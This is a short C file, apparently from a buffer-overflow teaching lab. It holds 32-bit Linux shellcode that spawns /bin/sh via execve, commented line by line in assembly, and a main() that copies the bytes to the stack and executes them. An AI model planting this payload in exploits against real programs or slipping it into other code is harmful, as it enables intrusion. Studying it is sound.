#include <stdlib.h>
#include <stdio.h>
const char code[] =
"\x31\xc0"
"\x50"
"\x68""//sh"
"\x68""/bin"
"\x89\xe3"
"\x50"
"\x53"
"\x89\xe1"
"\x99"
"\xb0\x0b"
"\xcd\x80"
;
/* Line 1: xorl %eax,%eax */
/* Line 2: pushl %eax */
/* Line 3: pushl $0x68732f2f */
/* Line 4: pushl $0x6e69622f */
/* Line 5: movl %esp,%ebx */
/* Line 6: pushl %eax */
/* Line 7: pushl %ebx */
/* Line 8: movl %esp,%ecx */
/* Line 9: cdq */
/* Line 10: movb $0x0b,%al */
/* Line 11: int $0x80 */
int main(int argc, char **argv)
{
char buf[sizeof(code)];
strcpy(buf, code);
((void(*)( ))buf)( );
}

